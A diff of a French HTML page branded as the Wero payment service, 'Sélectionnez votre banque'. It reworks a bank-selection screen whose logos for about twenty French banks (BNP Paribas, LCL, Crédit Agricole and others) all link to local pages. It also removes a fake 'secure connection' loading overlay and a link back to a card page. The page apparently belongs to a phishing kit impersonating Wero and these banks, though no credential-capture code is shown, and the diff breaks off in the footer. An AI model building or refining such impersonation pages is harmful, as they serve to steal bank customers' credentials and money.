@@ -7,25 +7,18 @@
     <title>Wero - Sélectionnez votre banque</title>
     
     <link rel="icon" href="images/icon.png" type="image/png">
-    
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;700;800;900&display=swap" rel="stylesheet">
     
     <style>
-        /* ================= VARIABLES ================= */
         :root {
             --wero-yellow: #FFF69C;
-            --wero-yellow-hover: #fff275;
             --black: #000000;
             --white: #ffffff;
             --gray-light: #F9FAFB;
-            --gray-medium: #E5E7EB;
-            --gray-dark: #1F2937;
-            --gray-text: #4B5563;
         }
 
-        /* ================= BASE STYLES ================= */
         * {
             box-sizing: border-box;
             font-family: 'Plus Jakarta Sans', sans-serif !important;
@@ -36,911 +29,133 @@
         body {
             background-color: var(--gray-light);
             color: var(--black);
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
             overflow-x: hidden;
             display: flex;
             flex-direction: column;
             min-height: 100vh;
         }
 
-        a { text-decoration: none; color: inherit; transition: color 0.2s ease-in-out; }
-        button { border: none; background: none; cursor: pointer; font-family: inherit; }
-        img { max-width: 100%; height: auto; display: block; }
-        .hidden { display: none !important; }
-
-        /* ================= NAVBAR ================= */
-        .header {
+        header {
             width: 100%;
-            border-bottom: 1px solid var(--gray-medium);
-            position: relative;
+            border-bottom: 1px solid #E5E7EB;
             background-color: var(--white);
-            z-index: 50;
-        }
-
-        .navbar-container {
             padding: 1rem 1.25rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 13px;
-            font-weight: 700;
-            letter-spacing: 0.025em;
-            text-transform: uppercase;
         }
 
-        @media (min-width: 768px) { .navbar-container { padding: 1.25rem 2rem; } }
-
-        .logo-container { z-index: 50; cursor: pointer; }
-        #site-logo { height: 2.2rem; object-fit: contain; }
-        @media (min-width: 768px) { #site-logo { height: 3rem; } }
-
-        #logo-fallback {
-            font-size: 1.25rem;
+        .logo-container {
+            font-size: 1.5rem;
             font-weight: 900;
-            letter-spacing: -0.05em;
             color: var(--black);
-            user-select: none;
-        }
-        @media (min-width: 768px) { #logo-fallback { font-size: 1.5rem; } }
-
-        #mobile-menu-btn { padding: 0.5rem; color: var(--black); display: block; z-index: 50; }
-        @media (min-width: 1024px) { #mobile-menu-btn { display: none; } }
-
-        .desktop-nav { display: none; }
-        @media (min-width: 1024px) {
-            .desktop-nav { display: flex; align-items: center; gap: 1.5rem; color: var(--gray-dark); }
-        }
-        @media (min-width: 1200px) { .desktop-nav { gap: 2.5rem; } }
-
-        .nav-item-dropdown { cursor: pointer; display: flex; align-items: center; gap: 0.25rem; }
-        .nav-item-dropdown:hover, .nav-link:hover { color: var(--black); }
-
-        .lang-selector { display: none; }
-        @media (min-width: 1024px) {
-            .lang-selector {
-                display: flex; border-left: 1px solid var(--gray-medium); height: 4rem;
-                align-items: center; padding-left: 1.5rem; color: var(--black);
-                font-weight: 900; letter-spacing: 0.05em; cursor: pointer;
-            }
+            cursor: pointer;
         }
 
-        /* ================= MOBILE MENU ================= */
-        #mobile-menu {
-            display: flex; flex-direction: column; align-items: center; gap: 0.5rem;
-            background-color: var(--white); border-bottom: 1px solid var(--gray-medium);
-            position: absolute; width: 100%; left: 0; top: 100%; max-height: 0; opacity: 0;
-            overflow: hidden; transition: max-height 0.3s, opacity 0.3s, padding 0.3s;
-            color: var(--gray-dark); font-weight: 700; font-size: 0.875rem; z-index: 40;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-        }
-        @media (min-width: 1024px) { #mobile-menu { display: none !important; } }
-
-        .mobile-menu-item {
-            width: 100%; text-align: center; padding: 0.75rem 0;
-            border-bottom: 1px solid var(--gray-light); cursor: pointer;
-            text-decoration: none; color: inherit; display: block;
-        }
-        .mobile-menu-item:hover { color: var(--black); }
-
-        #mobile-menu-fr { width: 100%; text-align: center; padding: 1rem 0; font-weight: 900; letter-spacing: 0.05em; }
-        #mobile-menu-fr:hover { color: var(--black); }
-
-        /* ================= MAIN CONTENT : LISTE DES BANQUES ================= */
         main {
             flex: 1;
             width: 100%;
-            max-width: 650px;
+            max-width: 1200px;
             margin: 0 auto;
-            padding: 3rem 1.25rem 6rem;
+            padding: 3rem 1.25rem;
             display: flex;
             flex-direction: column;
-        }
-
-        @media (min-width: 768px) { main { padding-top: 5rem; } }
-
-        /* Bouton retour */
-        .back-button-container {
-            width: 100%;
-            margin-bottom: 1.5rem;
-        }
-
-        .back-button {
-            display: inline-flex;
             align-items: center;
-            gap: 8px;
-            background-color: white;
-            border: 1px solid #e2e8f0;
-            border-radius: 40px;
-            padding: 8px 16px;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1e293b;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
         }
 
-        .back-button:hover {
-            background-color: #f8fafc;
-            border-color: #cbd5e1;
-            transform: translateX(-2px);
-        }
-
-        .back-button svg {
-            width: 16px;
-            height: 16px;
-            stroke-width: 2.5;
-        }
-
-        .page-title {
-            font-size: 1.75rem;
+        h1 {
+            font-size: 2rem;
             font-weight: 900;
-            letter-spacing: -0.02em;
-            color: var(--black);
             text-align: center;
-            margin-bottom: 2rem;
-        }
-
-        .search-container {
-            display: flex;
-            align-items: center;
-            border-bottom: 1px solid var(--gray-medium);
-            padding-bottom: 0.75rem;
-            margin-bottom: 1.5rem;
-        }
-
-        .search-input {
-            border: none;
-            background: transparent;
-            flex-grow: 1;
-            font-size: 1rem;
-            font-weight: 500;
-            outline: none;
+            margin-bottom: 3rem;
             color: var(--black);
         }
 
-        .search-input::placeholder { color: #9CA3AF; }
-
-        .search-icon { width: 1.2rem; height: 1.2rem; stroke: var(--black); stroke-width: 2.5; fill: none; cursor: pointer; }
-
-        .country-selector { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1.5rem; cursor: pointer; }
-        .flag-icon { width: 22px; height: 16px; border-radius: 2px; box-shadow: 0 0 0 1px rgba(0,0,0,0.1); }
-        .country-text { font-size: 0.85rem; font-weight: 700; color: var(--gray-dark); }
-        .country-chevron { width: 0.85rem; height: 0.85rem; stroke: var(--gray-dark); stroke-width: 2.5; fill: none; }
-
-        /* Liste des banques */
-        .bank-list { 
-            display: flex; 
-            flex-direction: column; 
-            gap: 0.75rem;
-        }
-
-        .bank-card {
-            background-color: var(--white);
-            display: flex;
-            align-items: center;
-            padding: 0.75rem 1.25rem;
-            border-radius: 8px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
-            border: 1px solid transparent;
-            transition: all 0.2s ease;
-            cursor: pointer;
-            gap: 1.25rem;
-            text-decoration: none;
-        }
-
-        .bank-card:hover {
-            background-color: #f9fafb;
-            border-color: var(--black);
-            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
-            transform: translateY(-2px);
-        }
-
-        .bank-card:active {
-            transform: translateY(0) scale(0.99);
-        }
-
-        .bank-logo-box {
-            width: 64px;
-            height: 64px;
-            border: 2px solid var(--gray-medium);
-            border-radius: 6px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-            background-color: var(--white);
-            padding: 4px;
-            transition: border-color 0.2s;
-        }
-        
-        .bank-card:hover .bank-logo-box {
-            border-color: var(--black);
-        }
-
-        .bank-logo-box img { 
-            max-width: 100%; 
-            max-height: 100%; 
-            object-fit: contain; 
-        }
-
-        .bank-name { 
-            flex-grow: 1; 
-            font-weight: 800; 
-            font-size: 1.1rem;
-            color: var(--black); 
-        }
-
-        .bank-arrow-box {
-            width: 24px; 
-            height: 24px; 
-            border: 1.5px solid var(--black); 
-            display: flex;
-            align-items: center; 
-            justify-content: center; 
-            border-radius: 50%;
-            transition: background-color 0.2s, transform 0.2s;
-        }
-
-        .bank-arrow-box svg { 
-            width: 12px; 
-            height: 12px; 
-            stroke: var(--black); 
-            stroke-width: 2.5; 
-            fill: none; 
-            transition: stroke 0.2s; 
-        }
-
-        .bank-card:hover .bank-arrow-box {
-            background-color: var(--wero-yellow);
-            transform: translateX(4px);
-        }
-
-        /* ================= ECRAN DE CHARGEMENT ================= */
-        #loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
+        .bank-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+            gap: 2rem;
             width: 100%;
-            height: 100vh;
-            background-color: var(--gray-light);
-            z-index: 9999;
+        }
+
+        .bank-item {
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
+            cursor: pointer;
+            text-decoration: none;
+            transition: transform 0.2s;
         }
 
-        .hidden-overlay {
-            display: none !important;
+        .bank-item:hover {
+            transform: scale(1.1);
         }
 
-        .loading-container {
-            display: flex;
-            align-items: center;
-            gap: 2rem;
-            margin-bottom: 3rem;
-        }
-
-        .loading-icon-box {
-            width: 80px;
-            height: 80px;
-            background-color: var(--white);
-            border: 3px solid var(--black);
-            border-radius: 50%;
+        .bank-logo {
+            width: 110px;
+            height: 110px;
+            background: var(--white);
+            border-radius: 10px;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 15px;
-            box-shadow: 4px 4px 0px rgba(0,0,0,1);
-        }
-
-        .loading-icon-box.square {
-            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            transition: all 0.2s;
             padding: 10px;
         }
 
-        .loading-icon-box img {
-            width: 100%;
-            height: 100%;
+        .bank-item:hover .bank-logo {
+            box-shadow: 0 6px 16px rgba(0,0,0,0.15);
+            background-color: var(--wero-yellow);
+        }
+
+        .bank-logo img {
+            max-width: 100%;
+            max-height: 100%;
             object-fit: contain;
         }
 
-        .animated-arrow {
-            width: 50px;
-            height: 20px;
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            animation: pulse-arrow 1s infinite alternate;
-        }
-
-        .animated-arrow svg {
-            width: 100%;
-            height: 100%;
-            stroke: var(--black);
-            stroke-width: 3;
-            fill: none;
-        }
-
-        @keyframes pulse-arrow {
-            0% { transform: translateX(-5px); opacity: 0.5; }
-            100% { transform: translateX(5px); opacity: 1; }
-        }
-
-        .loading-text {
-            font-size: 1.25rem;
-            font-weight: 800;
-            text-transform: uppercase;
-            letter-spacing: -0.02em;
-            color: var(--black);
+        footer {
+            background-color: var(--white);
+            padding: 2rem 1.25rem;
             text-align: center;
+            font-size: 0.75rem;
+            color: #4B5563;
         }
-
-        /* ================= FOOTER ================= */
-        .site-footer { background-color: var(--white); color: var(--black); padding: 4rem 1.25rem 2rem; width: 100%; }
-        .site-footer-inner { max-width: 1280px; margin: 0 auto; }
-        @media (min-width: 768px) { .site-footer { padding: 6rem 4rem 2rem; } }
-        .footer-top { display: flex; flex-direction: column; gap: 4rem; margin-bottom: 6rem; }
-        @media (min-width: 768px) { .footer-top { flex-direction: row; justify-content: space-between; } }
-        .footer-links-container { display: flex; flex-direction: column; gap: 3rem; }
-        @media (min-width: 640px) { .footer-links-container { flex-direction: row; gap: 6rem; } }
-        .footer-col { display: flex; flex-direction: column; gap: 1.25rem; }
-        .footer-heading { font-size: 1.1rem; font-weight: 800; margin-bottom: 0.5rem; color: var(--black); }
-        .footer-link { font-size: 0.9rem; font-weight: 500; color: var(--gray-text); text-decoration: none; transition: color 0.2s; }
-        .footer-link:hover { color: var(--black); text-decoration: underline; text-underline-offset: 4px; }
-        .footer-logo { display: flex; align-items: center; }
-        .footer-logo img { height: 3rem; width: auto; object-fit: contain; }
-        @media (min-width: 768px) { .footer-logo img { height: 4.5rem; } }
-        .footer-bottom { display: flex; flex-direction: column; gap: 2rem; }
-        @media (min-width: 1024px) { .footer-bottom { flex-direction: row; justify-content: space-between; align-items: flex-end; } }
-        .footer-info { font-size: 0.75rem; color: var(--gray-text); line-height: 1.6; max-width: 600px; font-weight: 500; }
-        .footer-info p { margin-bottom: 1rem; }
-        .footer-info a.inline-underline { color: var(--black); text-decoration: underline; text-decoration-thickness: 1px; text-underline-offset: 3px;}
-        .footer-socials { display: flex; gap: 1rem; }
-        .social-icon { width: 2.5rem; height: 2.5rem; border-radius: 50%; background-color: var(--wero-yellow); border: 1px solid var(--black); display: flex; align-items: center; justify-content: center; transition: transform 0.2s, background-color 0.2s; color: var(--black); }
-        .social-icon:hover { transform: translateY(-2px); background-color: var(--wero-yellow-hover); }
-        .social-icon svg { width: 1.1rem; height: 1.1rem; fill: currentColor; }
-        .copyright { font-size: 0.75rem; margin-top: 2rem; }
-        .dropdown-icon { width: 0.75rem; height: 0.75rem; stroke-width: 3; fill: none; stroke: currentColor; }
-        .burger-icon { width: 1.5rem; height: 1.5rem; stroke-width: 2.5; fill: none; stroke: currentColor; }
-    
-        /* ===== OPTIMISATIONS MOBILE ===== */
-        * {
-            box-sizing: border-box;
-        }
-        
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            overflow-x: hidden;
-        }
-        
-        /* Responsive images */
-        img {
-            max-width: 100%;
-            height: auto;
-            display: block;
-        }
-        
-        /* Responsive text */
-        @media (max-width: 768px) {
-            body {
-                font-size: 14px;
-                line-height: 1.5;
-            }
-            
-            h1, .h1 { font-size: 20px !important; }
-            h2, .h2 { font-size: 18px !important; }
-            h3, .h3 { font-size: 16px !important; }
-            
-            /* Buttons */
-            button, .btn, [class*="btn"] {
-                min-height: 44px;
-                padding: 12px 20px !important;
-                font-size: 14px;
-            }
-            
-            /* Inputs */
-            input, select, textarea {
-                min-height: 44px;
-                padding: 12px;
-                font-size: 16px;
-            }
-            
-            /* Layout */
-            .container, main, section {
-                padding: 15px !important;
-            }
-            
-            /* Grid adjustments */
-            [class*="grid"], [class*="flex"] {
-                flex-direction: column;
-            }
-            
-            /* Hide unnecessary elements */
-            .hide-mobile {
-                display: none !important;
-            }
-        }
-        
-        @media (max-width: 480px) {
-            h1, .h1 { font-size: 18px !important; }
-            h2, .h2 { font-size: 16px !important; }
-            h3, .h3 { font-size: 14px !important; }
-            
-            button, .btn, [class*="btn"] {
-                width: 100%;
-                padding: 14px 16px !important;
-                font-size: 13px;
-            }
-            
-            input, select, textarea {
-                font-size: 16px;
-            }
-            
-            .container, main, section {
-                padding: 10px !important;
-            }
-        }
-
     </style>
 </head>
 <body>
-
-    <div id="loading-overlay" class="hidden-overlay">
-        <div class="loading-container">
-            <div class="loading-icon-box">
-                <img src="images/icon.png" alt="Wero Icon">
-            </div>
-            <div class="animated-arrow">
-                <svg viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" d="M5 12h14M12 5l7 7-7 7"></path>
-                </svg>
-            </div>
-            <div class="loading-icon-box square">
-                <img id="target-bank-img" src="" alt="Banque">
-            </div>
-        </div>
-        <div class="loading-text">Connexion sécurisée en cours...</div>
-    </div>
-    
-    <header class="header">
-        <div class="navbar-container">
-            <div class="logo-container" onclick="window.location.href='index.html'">
-                <img id="site-logo" src="images/wero.jpg" alt="Wero" class="hidden">
-                <span id="logo-fallback">wero</span>
-            </div>
-            
-            <button id="mobile-menu-btn">
-                <svg class="burger-icon" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
-                </svg>
-            </button>
-
-            <nav class="desktop-nav">
-                <div class="nav-item-dropdown" onclick="window.location.href='index.html'">
-                    <span>Utilisateurs</span>
-                    <svg class="dropdown-icon" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path></svg>
-                </div>
-                <div class="nav-item-dropdown" onclick="window.location.href='index.html'">
-                    <span>Professionnels</span>
-                    <svg class="dropdown-icon" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path></svg>
-                </div>
-                <a href="index.html" class="nav-link">Aide</a>
-                <a href="index.html" class="nav-link text-center leading-tight">À propos</a>
-                <a href="index.html" class="nav-link">Actualités</a>
-            </nav>
-
-            <div class="lang-selector" onclick="window.location.href='index.html'">FR</div>
-        </div>
-
-        <nav id="mobile-menu">
-            <a href="index.html" class="mobile-menu-item">Utilisateurs</a>
-            <a href="index.html" class="mobile-menu-item">Professionnels</a>
-            <a href="index.html" class="mobile-menu-item">Aide</a>
-            <a href="index.html" class="mobile-menu-item">À propos</a>
-            <a href="index.html" class="mobile-menu-item">Actualités</a>
-            <a href="index.html" id="mobile-menu-fr" style="display: block; text-decoration: none; color: inherit;">FR</a>
-        </nav>
+    <header>
+        <div class="logo-container" onclick="window.location.href='index.html'">wero</div>
     </header>
 
     <main>
-        <!-- Bouton Retour -->
-        <div class="back-button-container">
-            <button class="back-button" onclick="window.location.href='cartes.html'">
-                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path>
-                </svg>
-                Retour
-            </button>
-        </div>
-
-        <h1 class="page-title">Sélectionnez votre banque</h1>
+        <h1>Sélectionnez votre banque</h1>
         
-        <div class="search-container">
-            <input type="text" class="search-input" placeholder="Recherchez votre banque">
-            <svg class="search-icon" viewBox="0 0 24 24">
-                <circle cx="11" cy="11" r="8"></circle>
-                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
-            </svg>
-        </div>
-
-        <div class="country-selector">
-            <svg class="flag-icon" viewBox="0 0 3 2">
-                <rect width="1" height="2" fill="#002654"/>
-                <rect width="1" height="2" x="1" fill="#ffffff"/>
-                <rect width="1" height="2" x="2" fill="#ED2939"/>
-            </svg>
-            <span class="country-text">Banques Françaises</span>
-            <svg class="country-chevron" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M6 9l6 6 6-6"></path>
-            </svg>
-        </div>
-
-        <div class="bank-list">
-            
-            <a href="bcp.html" class="bank-card" data-logo="images/bcpbank.png">
-                <div class="bank-logo-box">
-                    <img src="images/bcpbank.png" alt="Banque BCP">
-                </div>
-                <div class="bank-name">Banque BCP</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-        
-            <a href="savoie.html" class="bank-card" data-logo="images/banque-savoie.jpg">
-                <div class="bank-logo-box">
-                    <img src="images/banque-savoie.jpg" alt="Banque de Savoie">
-                </div>
-                <div class="bank-name">Banque de Savoie</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="dupuy.html" class="bank-card" data-logo="images/banque-dupuy.png">
-                <div class="bank-logo-box">
-                    <img src="images/banque-dupuy.png" alt="Banque_Dupuy">
-                </div>
-                <div class="bank-name">Banque Dupuy, de Parseval</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="marze.html" class="bank-card" data-logo="images/marze.svg">
-                <div class="bank-logo-box">
-                    <img src="images/marze.svg" alt="Banque_Marze">
-                </div>
-                <div class="bank-name">Banque Marze</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-             <a href="palatine.html" class="bank-card" data-logo="images/palatine.svg">
-                <div class="bank-logo-box">
-                    <img src="images/palatine.svg" alt="Banque_Palatine">
-                </div>
-                <div class="bank-name">Banque Palatine</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="populaire.html" class="bank-card" data-logo="images/banque-populaire.png">
-                <div class="bank-logo-box">
-                    <img src="images/banque-populaire.png" alt="Banque Populaire">
-                </div>
-                <div class="bank-name">Banque Populaire</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="bnp.html" class="bank-card" data-logo="images/bnp.jfif">
-                <div class="bank-logo-box">
-                    <img src="images/bnp.jfif" alt="BNP Paribas">
-                </div>
-                <div class="bank-name">BNP Paribas</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="bred.html" class="bank-card" data-logo="images/bred.webp">
-                <div class="bank-logo-box">
-                    <img src="images/bred.webp" alt="BRED Banque Populaire">
-                </div>
-                <div class="bank-name">BRED Banque Populaire</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="caisse-epargne.html" class="bank-card" data-logo="images/caisse-epargne.png">
-                <div class="bank-logo-box">
-                    <img src="images/caisse-epargne.png" alt="Caisse d'Epargne">
-                </div>
-                <div class="bank-name">Caisse d'Epargne</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="cic.html" class="bank-card" data-logo="images/cic.png">
-                <div class="bank-logo-box">
-                    <img src="images/cic.png" alt="CIC">
-                </div>
-                <div class="bank-name">CIC</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="credit-agricole.html" class="bank-card" data-logo="images/credit-agricole.svg">
-                <div class="bank-logo-box">
-                    <img src="images/credit-agricole.svg" alt="Crédit Agricole">
-                </div>
-                <div class="bank-name">Crédit Agricole</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="cooperatif.html" class="bank-card" data-logo="images/cooperatif.jpeg">
-                <div class="bank-logo-box">
-                    <img src="images/cooperatif.jpeg" alt="Crédit Coopératif">
-                </div>
-                <div class="bank-name">Crédit Coopératif</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="maritime.html" class="bank-card" data-logo="images/maritime.png">
-                <div class="bank-logo-box">
-                    <img src="images/maritime.png" alt="Crédit Maritime">
-                </div>
-                <div class="bank-name">Crédit Maritime</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-             <a href="nickel.html" class="bank-card" data-logo="images/nickel.png">
-                <div class="bank-logo-box">
-                    <img src="images/nickel.png" alt="NICKEL">
-                </div>
-                <div class="bank-name">NICKEL</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="credit-mutuel.html" class="bank-card" data-logo="images/credit-mutuel.png">
-                <div class="bank-logo-box">
-                    <img src="images/credit-mutuel.png" alt="Crédit Mutuel">
-                </div>
-                <div class="bank-name">Crédit Mutuel</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="hello-bank.html" class="bank-card" data-logo="images/hello-bank.png">
-                <div class="bank-logo-box">
-                    <img src="images/hello-bank.png" alt="Hello bank! France">
-                </div>
-                <div class="bank-name">Hello bank! France</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-              <a href="fortuneo.html" class="bank-card" data-logo="images/fortuneo.svg.png">
-                <div class="bank-logo-box">
-                    <img src="images/fortuneo.svg.png" alt="Fortuneo Banque">
-                </div>
-                <div class="bank-name">Fortuneo Banque</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="banque-postale.html" class="bank-card" data-logo="images/banque-postale.png">
-                <div class="bank-logo-box">
-                    <img src="images/banque-postale.png" alt="La Banque Postale">
-                </div>
-                <div class="bank-name">La Banque Postale</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="lcl.html" class="bank-card" data-logo="images/lcl.png">
-                <div class="bank-logo-box">
-                    <img src="images/lcl.png" alt="LCL">
-                </div>
-                <div class="bank-name">LCL</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="monabanq.html" class="bank-card" data-logo="images/monabanq.png">
-                <div class="bank-logo-box">
-                    <img src="images/monabanq.png" alt="Monabanq">
-                </div>
-                <div class="bank-name">Monabanq</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="societe-generale.html" class="bank-card" data-logo="images/societe-generale.png">
-                <div class="bank-logo-box">
-                    <img src="images/societe-generale.png" alt="SG">
-                </div>
-                <div class="bank-name">Société Générale</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
-            <a href="wero.html" class="bank-card" data-logo="images/bank-icon.png">
-                <div class="bank-logo-box">
-                    <img src="images/bank-icon.png" alt="Autres Banques">
-                </div>
-                <div class="bank-name">Autres Banques</div>
-                <div class="bank-arrow-box">
-                    <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
-                </div>
-            </a>
-
+        <div class="bank-grid">
+            <a href="bcp.html" class="bank-item"><div class="bank-logo"><img src="images/bcpbank.png" alt="BCP"></div></a>
+            <a href="savoie.html" class="bank-item"><div class="bank-logo"><img src="images/banque-savoie.jpg" alt="Savoie"></div></a>
+            <a href="dupuy.html" class="bank-item"><div class="bank-logo"><img src="images/banque-dupuy.png" alt="Dupuy"></div></a>
+            <a href="marze.html" class="bank-item"><div class="bank-logo"><img src="images/marze.svg" alt="Marze"></div></a>
+            <a href="palatine.html" class="bank-item"><div class="bank-logo"><img src="images/palatine.svg" alt="Palatine"></div></a>
+            <a href="populaire.html" class="bank-item"><div class="bank-logo"><img src="images/banque-populaire.png" alt="Populaire"></div></a>
+            <a href="bnp.html" class="bank-item"><div class="bank-logo"><img src="images/bnp.jfif" alt="BNP"></div></a>
+            <a href="caisse-epargne.html" class="bank-item"><div class="bank-logo"><img src="images/caisse-epargne.png" alt="Caisse"></div></a>
+            <a href="cic.html" class="bank-item"><div class="bank-logo"><img src="images/cic.png" alt="CIC"></div></a>
+            <a href="credit-agricole.html" class="bank-item"><div class="bank-logo"><img src="images/credit-agricole.svg" alt="CA"></div></a>
+            <a href="cooperatif.html" class="bank-item"><div class="bank-logo"><img src="images/cooperatif.jpeg" alt="Coop"></div></a>
+            <a href="maritime.html" class="bank-item"><div class="bank-logo"><img src="images/maritime.png" alt="Maritime"></div></a>
+            <a href="nickel.html" class="bank-item"><div class="bank-logo"><img src="images/nickel.png" alt="Nickel"></div></a>
+            <a href="credit-mutuel.html" class="bank-item"><div class="bank-logo"><img src="images/credit-mutuel.png" alt="CM"></div></a>
+            <a href="hello-bank.html" class="bank-item"><div class="bank-logo"><img src="images/hello-bank.png" alt="Hello"></div></a>
+            <a href="fortuneo.html" class="bank-item"><div class="bank-logo"><img src="images/fortuneo.svg.png" alt="Fortuneo"></div></a>
+            <a href="banque-postale.html" class="bank-item"><div class="bank-logo"><img src="images/banque-postale.png" alt="BP"></div></a>
+            <a href="lcl.html" class="bank-item"><div class="bank-logo"><img src="images/lcl.png" alt="LCL"></div></a>
+            <a href="monabanq.html" class="bank-item"><div class="bank-logo"><img src="images/monabanq.png" alt="Monabanq"></div></a>
+            <a href="societe-generale.html" class="bank-item"><div class="bank-logo"><img src="images/societe-generale.png" alt="SG"></div></a>
+            <a href="wero.html" class="bank-item"><div class="bank-logo"><img src="images/bank-icon.png" alt="Autres"></div></a>
         </div>
     </main>
 
-    <footer class="site-footer">
-        <div class="site-footer-inner">
-            <div class="footer-top">
-                <div class="footer-links-container">
-                    <div class="footer-col">
-                        <div class="footer-heading">Découvrir</div>
-                        <a href="index.html" class="footer-link">Accueil</a>
-                        <a href="index.html" class="footer-link">Utilisateurs</a>
-                        <a href="index.html" class="footer-link">Professionnels</a>
-                        <a href="index.html" class="footer-link">Aide</a>
-                        <a href="index.html" class="footer-link">À propos</a>
-                        <a href="index.html" class="footer-link">Actualités</a>
-                    </div>
-                    <div class="footer-col">
-                        <div class="footer-heading">Informations pratiques</div>
-                        <a href="index.html" class="footer-link">Centre de confidentialité</a>
